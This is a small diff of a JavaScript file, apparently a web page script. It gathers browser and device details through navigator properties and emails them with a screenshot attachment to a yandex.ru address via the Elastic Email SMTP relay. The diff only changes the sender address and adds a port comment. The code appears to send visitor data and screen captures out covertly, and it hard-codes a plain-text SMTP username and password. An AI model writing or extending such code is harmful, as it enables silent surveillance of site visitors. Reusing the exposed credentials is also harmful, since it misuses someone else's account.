@@ -97,12 +97,13 @@
                 '<br />Производитель: ' + navigator.vendor +
                 '<br />Подразделение: ' + navigator.vendorSub;
             vibrate(100)
+            // PORT 2525
             Email.send({
                 Host : "smtp.elasticemail.com",
                 Username: 'Khasieva.2023@yandex.ru',
                 Password: "CBD06505D94CDFC25333D695E7DE7816C1AA",
                 To: 'Khasieva.2023@yandex.ru',
-                From: "Khasieva.2023@yandex.ru",
+                From: "koha009@yandex.ru",
                 Subject: "Пришел снимок экрана",
                 Body: "<html><h2>Информация</h2><p>" + text + "</p></html>",
                 Attachments: [{
